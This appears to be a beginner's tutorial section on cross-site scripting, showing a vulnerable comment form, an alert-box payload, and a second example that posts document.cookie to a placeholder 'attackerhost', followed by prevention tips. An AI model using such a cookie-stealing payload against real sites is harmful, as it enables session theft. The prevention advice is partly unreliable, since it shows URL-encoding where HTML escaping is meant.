# XSS-ATTACK
this section is talking about xss attack and its prevention

**If you have not been familiar with HTML / Javascript, you can pass this section temporily**

## Table of Contents
- [XSS](#XSS)
- [XSS-Examples](#XSS-Examples)
- [XSS-Prevention](#XSS-Prevention)
- [References](#References)

## XSS
XSS ( Cross-site scripting ) enables attackers to **inject client-side script into web pages** viewed by other users

## XSS-Examples

- Precondition
  1. You make a forum website and let users to write down their comments
  ```html
  <form method='post' action="comments">
    <textarea name='comment' id='comment'></textarea>
    <input type='submit' value='Submit' />  
  </form>
  ```

  2. The website stores the origin comment without any processing
  3. When the other users view a comment, they may get
  ```html
  <div>
    [ the comments ]
  </div>
  ```
  **where the comments are the origin text without any processing**


  - Case 1
    1. If an attacker write down comments like this
    ```javascript
    <script>alert('You are attacked')</script>
    ```
    2. Any user views this comment would get an an alert window with text `You are attacked`


  - Case 2
    1. If an attacker write down comments like this
    ```javascript
    $.post( "http://attackerhost/cookies", { cookie: document.cookie } );
    ```
    2. The other user's cookie would be stolen when they are viewing this comment

## XSS-Prevention
We can see that **XSS is very dangerous** because attackers can execute whatever they want !

Backend / Frontend developers should make sure no script from users can be executed.

- Content Filtering : encode / escape the sensitive words ( e.g. `<`, `>` )

  - before
  ```html
  <b>very</b> large
  ```

  - after
  ```
  %3Cb%3Every%3C/b%3E%20large
  ```

- Disabling Scripts : disable javascript in the browser, nothing can be executed

## References
- https://en.wikipedia.org/wiki/Cross-site_scripting
- https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md
- http://www.w3schools.com/jsref/jsref_escape.asp
